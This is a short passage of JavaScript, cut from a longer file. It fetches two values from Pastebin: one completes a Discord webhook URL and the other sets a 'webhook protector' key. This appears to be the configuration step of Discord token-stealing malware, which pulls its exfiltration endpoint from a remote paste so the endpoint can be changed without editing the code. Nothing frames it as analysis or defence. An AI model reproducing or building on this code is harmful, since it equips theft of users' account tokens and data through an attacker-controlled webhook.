...
https.get('https://pastebin.com/raw/2ctnjUvf', function (res1) {
    res1.setEncoding('utf8');
    res1.on('data', function (chunk1) {
        config.webhook = 'https://discord.com/api/webhooks/' + chunk1;
    })
});

https.get('https://pastebin.com/raw/0yxUcUjK', function (res2) {
    res2.setEncoding('utf8');
    res2.on('data', function (chunk2) {
        config.webhook_protector_key = chunk2;
    })
});
